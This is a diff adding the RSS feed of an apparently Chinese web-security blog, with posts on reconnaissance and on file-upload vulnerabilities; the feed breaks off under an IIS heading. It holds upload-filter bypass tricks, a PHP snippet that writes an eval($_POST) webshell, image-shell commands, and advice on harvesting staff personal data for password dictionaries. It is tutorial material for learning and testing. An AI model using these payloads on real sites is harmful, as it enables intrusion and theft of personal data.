@@ -1,0 +1,710 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Go1f&#39;s Blog</title>
+    <link>http://go1f.cc/</link>
+    <description>Recent content on Go1f&#39;s Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-cn</language>
+    <lastBuildDate>Wed, 22 Jan 2020 00:00:00 +0000</lastBuildDate>
+    
+        <atom:link href="http://go1f.cc/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>About</title>
+      <link>http://go1f.cc/about/</link>
+      <pubDate>Sun, 20 Aug 2017 21:38:52 +0800</pubDate>
+      
+      <guid>http://go1f.cc/about/</guid>
+      
+        <description>&lt;p&gt;Hugo is a static site engine written in Go.&lt;/p&gt;
+&lt;p&gt;It makes use of a variety of open source projects including:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/spf13/cobra&#34;&gt;Cobra&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/spf13/viper&#34;&gt;Viper&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/spf13/jWalterWeatherman&#34;&gt;J Walter Weatherman&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/spf13/cast&#34;&gt;Cast&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Learn more and contribute on &lt;a href=&#34;https://github.com/gohugoio&#34;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
+</description>
+      
+    </item>
+    
+    <item>
+      <title>网站信息搜集</title>
+      <link>http://go1f.cc/post/web%E5%AE%89%E5%85%A8/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</link>
+      <pubDate>Wed, 22 Jan 2020 00:00:00 +0000</pubDate>
+      
+      <guid>http://go1f.cc/post/web%E5%AE%89%E5%85%A8/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</guid>
+      
+        <description>&lt;p&gt;主动信息收集：与目标主机直接交互&lt;/p&gt;
+&lt;p&gt;被动信息收集：通过搜索引擎或社会工程获取目标信息&lt;/p&gt;
+&lt;h2 id=&#34;网站信息收集&#34;&gt;网站信息收集&lt;/h2&gt;
+&lt;h3 id=&#34;工具利用&#34;&gt;工具利用&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;综合类&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;wappalyzer插件 (CMS/网站脚本语言/中间件)&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.osint-labs.org/apt/&#34;&gt;OSINT-CN情报/工具合集&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;CMS指纹&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/urbanadventurer/WhatWeb&#34;&gt;whatweb工具&lt;/a&gt;、&lt;a href=&#34;http://whatweb.bugscaner.com/look/&#34;&gt;CMS识别&lt;/a&gt;、&lt;a href=&#34;http://www.yunsee.cn/finger.html&#34;&gt;云悉&lt;/a&gt;、&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞收集&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.seebug.org/&#34;&gt;知道创宇 Seebug&lt;/a&gt; 、乌云漏洞库、&lt;a href=&#34;https://www.exploit-db.com/&#34;&gt;exploit-db&lt;/a&gt; 搜索CMS等关键词，必要时源代码审计&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.zoomeye.org/&#34;&gt;钟馗之眼 zoomeye&lt;/a&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;app=&amp;quot;dedecms&amp;quot; &amp;amp;&amp;amp; country=&amp;quot;CN&amp;quot; &amp;amp;&amp;amp; server=&amp;quot;Apache&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;“相关漏洞”功能&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Google it  &lt;code&gt;&amp;lt;cmsname&amp;gt;  漏洞/exp/poc/exploit/bug&lt;/code&gt;&lt;/p&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;h3 id=&#34;cms版本&#34;&gt;cms版本&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;指定目录或特殊文件&lt;/p&gt;
+&lt;p&gt;页面底部版权信息 (关键字 Powered By等)&lt;/p&gt;
+&lt;p&gt;注释的html代码内容&lt;/p&gt;
+&lt;p&gt;robots.txt文件中关键字&lt;/p&gt;
+&lt;p&gt;报错 (例:thinkPHP)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;h3 id=&#34;中间件&#34;&gt;中间件&lt;/h3&gt;
+&lt;p&gt;apache、nginx、IIS、tomcat及其具体版本&lt;/p&gt;
+&lt;h3 id=&#34;脚本语言&#34;&gt;脚本语言&lt;/h3&gt;
+&lt;h3 id=&#34;网站敏感目录&#34;&gt;网站敏感目录&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;举例&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;.SVN、.git、网站备份压缩文件、.DS_Store文件、_MAC_STORE、WEB-INF文件、配置文件泄露&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;工具&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Burpsuit Sitemap、7kbscan、御剑&lt;/p&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;h3 id=&#34;子域名站群&#34;&gt;子域名/站群&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/shmilylty/OneForAll&#34;&gt;OneForAll子域名查询&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;http://stool.chinaz.com/same&#34;&gt;同IP网站查询&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://phpinfo.me/domain/&#34;&gt;子域名在线扫描&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;网站个人信息&#34;&gt;网站个人信息&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;企业基本信息&lt;/li&gt;
+&lt;li&gt;员工信息、组织框架、企业法人、企业综合信息&lt;/li&gt;
+&lt;li&gt;员工信息：姓名、工号、家庭、交际信息、上网习惯&lt;/li&gt;
+&lt;li&gt;员工身份信息：员工简历、身份证、手机号、生日、家乡、住址&lt;/li&gt;
+&lt;li&gt;社交账号信息：qq、qq群、微博、微信、支付宝、员工邮箱账号&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;手机号能干什么&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;空手机，电话本，进入qq，关联通讯录&lt;/p&gt;
+&lt;p&gt;微信，关联通讯录，找微信&lt;/p&gt;
+&lt;p&gt;支付宝，转账，*xx，猜姓氏&lt;/p&gt;
+&lt;p&gt;微博&lt;/p&gt;
+&lt;p&gt;生成社工字典？？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;p&gt;&lt;strong&gt;弱口令与暴力破解&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;域名&lt;/p&gt;
+&lt;p&gt;whois查询&amp;gt;联系方式&amp;gt;社工库/google/baidu&lt;/p&gt;
+&lt;p&gt;whois反查其它域名，域名内容探测，收集信息&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;ip&lt;/p&gt;
+&lt;p&gt;端口服务、ip地信息&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;目标相关人员&lt;/p&gt;
+&lt;p&gt;搜索引擎，豆瓣、知乎、微博等等社交平台，越活跃，越多信息&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;搜集信息生成字典&lt;/p&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;h2 id=&#34;服务器信息收集&#34;&gt;服务器信息收集&lt;/h2&gt;
+&lt;h3 id=&#34;开放端口&#34;&gt;开放端口&lt;/h3&gt;
+&lt;h4 id=&#34;扫描端口&#34;&gt;扫描端口&lt;/h4&gt;
+&lt;p&gt;nmap / zenmap(GUI界面)&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;nmap domain -v -O&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;-v    查看详情&lt;/p&gt;
+&lt;p&gt;-A    指纹信息收集&lt;/p&gt;
+&lt;p&gt;-O    系统版本估计&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;k8portscan&lt;/p&gt;
+&lt;h4 id=&#34;数据库识别&#34;&gt;数据库识别&lt;/h4&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th align=&#34;left&#34;&gt;数据库&lt;/th&gt;
+&lt;th&gt;端口&lt;/th&gt;
+&lt;th&gt;相关&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td align=&#34;left&#34;&gt;SQL Server&lt;/td&gt;
+&lt;td&gt;1433&lt;/td&gt;
+&lt;td&gt;文件后缀.mdf、ASP&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;left&#34;&gt;MySQL&lt;/td&gt;
+&lt;td&gt;3306&lt;/td&gt;
+&lt;td&gt;PHP&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;left&#34;&gt;ACCESS&lt;/td&gt;
+&lt;td&gt;\&lt;/td&gt;
+&lt;td&gt;文件后缀.mdb、ASP&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;left&#34;&gt;Oracle&lt;/td&gt;
+&lt;td&gt;1521&lt;/td&gt;
+&lt;td&gt;JSP&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;left&#34;&gt;MongoDB&lt;/td&gt;
+&lt;td&gt;27017&lt;/td&gt;
+&lt;td&gt;非关系型数据库&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;left&#34;&gt;Redis&lt;/td&gt;
+&lt;td&gt;6379&lt;/td&gt;
+&lt;td&gt;非关系型数据库&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&#34;left&#34;&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;h3 id=&#34;操作系统&#34;&gt;操作系统&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;特殊端口&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;rpc 135 、smb 445、rdp 3389&lt;/p&gt;
+&lt;p&gt;ssh 22&lt;/p&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;p&gt;&lt;strong&gt;大小写敏感&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;后缀名Windows不区分大小写，而Linux大小写敏感，例：&lt;code&gt;index.HTml&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;ping探测&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Windows的TTL的值是128，而Linux的TTL大多是64&lt;/p&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;h3 id=&#34;cdn绕过真实-ip&#34;&gt;CDN绕过/真实 IP&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;多地PING（使用外网IP PING可能暴露真实IP）&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;证书报错&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;查询历史DNS记录&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;查询子域名&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;网络引擎搜索法&lt;/p&gt;
+&lt;p&gt;shodan &lt;code&gt;http.tittle:xxx&lt;/code&gt; 、fofa &lt;code&gt;tittle=&amp;quot;tittle&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;网站邮件订阅 / RSS / 注册、激活、找回密码（邮件服务器为真实服务器，邮件信头有来源信息）&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;扫描全网&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;PING二级域名（针对非全站CDN，一般子域名不用CDN）&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;h3 id=&#34;网络搜索引擎&#34;&gt;网络搜索引擎&lt;/h3&gt;
+&lt;h4 id=&#34;shodan&#34;&gt;shodan&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;语法&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;port 端口号、os 操作系统类型、&lt;/p&gt;
+&lt;p&gt;html.html 网页内容、 html.tittle 网页标题&lt;/p&gt;
+&lt;p&gt;http.server http请求返回server的类型&lt;/p&gt;
+&lt;p&gt;city 城市、country 国家&lt;/p&gt;
+&lt;p&gt;product 所使用的软件或产品product:&amp;ldquo;apache&amp;rdquo;、 vuln CVE漏洞编号，例如vuln: CVE-2014-0723&lt;/p&gt;
+&lt;p&gt;net 搜索网段，例如，net：123.12.1.0/24&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://www.cnblogs.com/miaodaren/p/9177379.html&#34;&gt;Shodan的http.favicon.hash语法详解与使用技巧&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;环境要求 python2.7 VCForPython27.msi pip mmh3 requests&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#iconhash.py
+import mmh3
+import requests
+ 
+response = requests.get(&#39;http://127.0.0.1/favicon.ico&#39;)
+favicon = response.content.encode(&#39;base64&#39;)
+hash = mmh3.hash(favicon)
+print(hash)
+&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;py -2 iconhash.py
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;搜索语法&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http.favicon.hash:-231109625
+&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
+&lt;p&gt;bwapp的图标hash&lt;/p&gt;
+&lt;p&gt;-689227143&lt;/p&gt;
+&lt;p&gt;dvwa的网站图标hash&lt;/p&gt;
+&lt;p&gt;-231109625&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;h2 id=&#34;扫描器&#34;&gt;扫描器&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;awvs 漏洞扫描器 的使用&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;appscan、massscan、nessus等&lt;/p&gt;
+</description>
+      
+    </item>
+    
+    <item>
+      <title>文件上传漏洞</title>
+      <link>http://go1f.cc/post/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</link>
+      <pubDate>Mon, 20 Jan 2020 00:00:00 +0000</pubDate>
+      
+      <guid>http://go1f.cc/post/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</guid>
+      
+        <description>&lt;p&gt;&lt;strong&gt;途径&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;相册、头像&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;视频、照片分享&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;附件上传&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;文件管理器&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;前端检验&#34;&gt;前端检验&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;删除或者禁用js&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;burpsuit代理控制POST content&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;filename=&amp;quot;shell.php&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;content-Type: image/jpeg&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;修改js程序&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;mime文件类型检验&#34;&gt;MIME文件类型检验&lt;/h2&gt;
+&lt;p&gt;MIME文件定义在web服务器的/conf/mime.types&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;常见MIME&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;text/plain &amp;gt; txt;  text/javascript&amp;gt;js;&lt;/p&gt;
+&lt;p&gt;image/png &amp;gt; png; image/gif  &amp;gt; gif; image/jpeg &amp;gt;  jpeg jpg;&lt;/p&gt;
+&lt;p&gt;application/msword &amp;gt; doc; application/pdf &amp;gt; pdf;&lt;/p&gt;
+&lt;p&gt;video/mp4 &amp;gt; mp4; video/x-msvideo &amp;gt; avi; video/x-flv &amp;gt; flv;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;绕过&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;修改“Content-Type”字段为合法MIME类型&lt;/p&gt;
+&lt;h2 id=&#34;扩展名检验&#34;&gt;扩展名检验&lt;/h2&gt;
+&lt;h3 id=&#34;黑名单检测&#34;&gt;黑名单检测&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;黑名单列表绕过&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;AddType application/x-httpd-php   .php .phtml .php5 .php3&lt;/code&gt; .shtml&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;jsp jspx jspf&lt;/p&gt;
+&lt;p&gt;asp asa cer cdx aspx ashx&lt;/p&gt;
+&lt;p&gt;php php3 php4 php5&lt;/p&gt;
+&lt;p&gt;exe exee&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;大小写绕过&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;.PHP .pHp .aSp&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;黑名单字符串替换绕过&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;针对单次替换，双写&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;str_replace(&amp;quot;php&amp;quot;, &amp;quot; &amp;quot;, &amp;quot;shell.pphphp&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;userini绕过&#34;&gt;.user.ini绕过&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&#34;https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html&#34;&gt;&lt;strong&gt;文件构成的PHP后门&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;让同目录下正常的php文件都“自动”包含某个文件&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;auto_prepend_file=01.gif
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;借助图片马，造成文件包含。&lt;/p&gt;
+&lt;h3 id=&#34;htaccess-间接绕过&#34;&gt;.htaccess 间接绕过&lt;/h3&gt;
+&lt;p&gt;利用.htaccess（apache的分布式配置文件） 添加文件后缀做php解析&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;条件&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Apache+mod_php5 模式&lt;/li&gt;
+&lt;li&gt;apache 启用 AllowOverride&lt;/li&gt;
+&lt;li&gt;黑名单过滤.htaccess文件&lt;/li&gt;
+&lt;li&gt;多个上传文件在一个文件夹或子文件夹共存&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;原理&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/adforce/archive/2012/11/23/2784664.html&#34;&gt;.htaccess 详解&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;当前目录的.htaccess文件会覆盖全局httpd.conf的配置&lt;/p&gt;
+&lt;p&gt;自行构建一个&amp;rdquo;.htaccess&amp;quot;文件做上传：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;AddType application/x-httpd-php  .abc
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;或&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;FilesMatch &amp;quot;abc&amp;quot;&amp;gt;
+    SetHandler application/x-httpd-php
+&amp;lt;/FilesMatch&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;windows系统特性&#34;&gt;Windows系统特性&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;文件后缀添加空格&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;文件后缀添加 &lt;code&gt;.&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;shell.php.
+shell.php. .
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Windows下自动将非法字符去掉&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;添加 ::$DATA后缀&lt;/p&gt;
+&lt;p&gt;NTFS ADS流格式 &lt;code&gt;filename.ext::$DATA&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;$DATA代表了主数据流的数据，用于绕过黑名单后缀检测&lt;/p&gt;
+&lt;p&gt;引用：&lt;a href=&#34;https://veritas501.space/2017/03/04/%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80%20-%20NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81ADS/&#34;&gt;脑洞大开 - NTFS交换数据流ADS&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;0x00截断&#34;&gt;0x00截断&lt;/h3&gt;
+&lt;h4 id=&#34;cve-2006-7243httpswwwlinuxidccomlinux2012-0458534htm&#34;&gt;&lt;a href=&#34;https://www.linuxidc.com/Linux/2012-04/58534.htm&#34;&gt;CVE-2006-7243&lt;/a&gt;&lt;/h4&gt;
+&lt;p&gt;PHP 5.3.4之前版本&lt;strong&gt;路径名&lt;/strong&gt;中接受\0字符，通过在此&lt;strong&gt;字符后放置安全的文件扩展名&lt;/strong&gt;，攻击者可绕过目标访问限制。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;文件命名：
+shell.php%00.jpg
+若文件存放路径可控，修改路径
+upload/test.php%00/avatar.png
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;条件&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;php&amp;lt;5.3.4  &amp;amp;&amp;amp; magic_qutoes_gpc off&lt;/p&gt;
+&lt;h4 id=&#34;cve-2015-2348httpswwwfreebufcomvuls62811html&#34;&gt;&lt;a href=&#34;https://www.freebuf.com/vuls/62811.html&#34;&gt;CVE-2015-2348&lt;/a&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;触发函数&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;比如move_uploaded_file(),getimagesize(), imagecreatefromjpeg()…等&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;move_uploaded_file($_FILES[&#39;name&#39;][&#39;tmp_name&#39;],&amp;quot;/file.php\x00.jpg&amp;quot;);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;条件&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;php版本在 5.4.39, 5.5.x – 5.5.23, 或者 5.6.x – 5.6.7，且上传的文件名保留&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );
+
+move_uploaded_file($_FILES[&#39;uploaded&#39;][&#39;tmp_name&#39;], $target_path);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;**PS：**截断字符的 get提交   &lt;code&gt;%00&lt;/code&gt;，post提交需要对&lt;code&gt;%00&lt;/code&gt; url解码；&lt;/p&gt;
+&lt;p&gt;代码审计：重点关注不经过赋值和过滤、直接拼接的 &lt;code&gt;$_GET&lt;/code&gt;、&lt;code&gt;$_POST&lt;/code&gt;等外部引入的可控变量&lt;/p&gt;
+&lt;h2 id=&#34;读写条件竞争&#34;&gt;读写条件竞争&lt;/h2&gt;
+&lt;p&gt;使用burpsuit爆破模块，上传恶意代码文件的同时请求访问该资源（在本地生成一句话木马）&lt;/p&gt;
+&lt;p&gt;恶意代码如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+ fputs(fopen(&#39;1.php&#39;,&#39;w&#39;),&#39;&amp;lt;? eval($_POST[a]);?&amp;gt;&#39;);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;代码审计时留意 &lt;strong&gt;移动&lt;/strong&gt;、&lt;strong&gt;改名&lt;/strong&gt;、&lt;strong&gt;上传&lt;/strong&gt;等文件操作的逻辑顺序&lt;/p&gt;
+&lt;h2 id=&#34;文件内容检验&#34;&gt;文件内容检验&lt;/h2&gt;
+&lt;h3 id=&#34;文件幻数检测&#34;&gt;文件幻数检测&lt;/h3&gt;
+&lt;p&gt;jpg文件幻数 JPGGraphic File，16进制：FFD8FFE000104A464946&lt;/p&gt;
+&lt;p&gt;gif文件幻数  GIF89a 或 GIF87a，16进制： 474946383961&lt;/p&gt;
+&lt;p&gt;png文件幻数 Zip Compressed，16进制： 89504E47&lt;/p&gt;
+&lt;h3 id=&#34;文件相关信息检测&#34;&gt;文件相关信息检测&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;制作图片马&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#windows /b 二进制； /a ASCII&lt;/span&gt;
+copy logo.png /b + shell.php /a  picshell.png
+&lt;span style=&#34;color:#75715e&#34;&gt;#linux&lt;/span&gt;
+cp logo.jpg /b + shell.php /a hack.jpg
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;文件加载检测&#34;&gt;文件加载检测&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;绕过二次渲染函数&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;imagecreatefromjpeg 二次渲染jpeg图片&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;检验工具：winhex 文件对比软件&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;手动方法：往二次渲染前后不变的地方插入代码，一般在一段连续&lt;code&gt;00 00 00 00 00&lt;/code&gt;里进行插入一句话。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;使用脚本：&lt;/p&gt;
+&lt;p&gt;jpg_payload.php、png_payload.php脚本&lt;/p&gt;
+&lt;p&gt;对二次渲染后的图片，执行命令&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;php jpg_payload.php shell.jpg
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;​&lt;/p&gt;
+&lt;h2 id=&#34;解析漏洞&#34;&gt;解析漏洞&lt;/h2&gt;
+&lt;p&gt;中间件（解析非php后缀文件）&lt;/p&gt;
+&lt;p&gt;》》》php解析运行（版本&amp;lt;5.3.9忽略后缀直接解析，往后版本有security.security.limit_extensions限制）&lt;/p&gt;
+&lt;h3 id=&#34;iis&#34;&gt;IIS&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;IIS 5.x - 6.x&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;xx.asp目录解析&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;服务器默认将xx.asp目录下的文件都解析为asp文件&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;文件解析&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;服务器默认不解析；号后面的内容，于是xx.asp;.jpg文件解析作asp文件&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;IIS 7.0/7.5&lt;/strong&gt;&lt;/p&gt;
